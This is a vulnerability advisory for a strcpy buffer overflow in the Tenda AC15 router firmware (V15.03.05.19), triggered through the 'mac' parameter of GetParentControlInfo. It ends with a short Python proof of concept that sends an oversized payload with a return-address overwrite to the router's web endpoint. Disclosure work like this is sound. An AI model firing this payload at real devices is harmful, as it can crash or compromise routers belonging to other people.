# TendaAC15v15.03.05.19GetParentControlInfo

## Overview

- Firmware download website: https://www.tenda.com.cn/material/show/102680

## Affected version

AC15v1.0 V15.03.05.19

## Vulnerability details

In this code, `strcpy` is used to copy the string pointed to by `src` to the memory area pointed to by `s` at offset 2. The problems are as follows:

1. **The target buffer size is unclear**: `s` is allocated `0x254` bytes of memory (596 bytes), but `strcpy` does not check the size of the target buffer and directly copies the contents of `src` to the `s + 2` position. If the length of the `src` string exceeds the memory space available after the `s + 2` position, `strcpy` will cause a buffer overflow.
2. **The size of `src` is not verified**: `src` is obtained from `sub_2BA8C(a1, "mac", &unk_EDD28)`, and it is not ensured that the string does not exceed the size of the memory space after the `s + 2` offset. If the length of `src` is too long and exceeds the memory range allocated by `s`, `strcpy` will write to the out-of-bounds memory area, causing an overflow.

![image-20250117235701292](F:\Desktop\工具\二进制漏洞\IoT\img\image-20250117235701292.png)

## POC

```python
import requests

def create_payload():
    return b"A" * 51200 + b"\xef\xbe\xad\xde"

def send_payload(url, payload):
    response = requests.get(url, params={'mac': payload})
    print(f"Response status code: {response.status_code}\nResponse body: {response.text}")

if __name__ == "__main__":
    send_payload("http://192.168.1.100/goform/GetParentControlInfo", create_payload())
```

![image-20250117235917205](F:\Desktop\工具\二进制漏洞\IoT\img\image-20250117235917205.png)

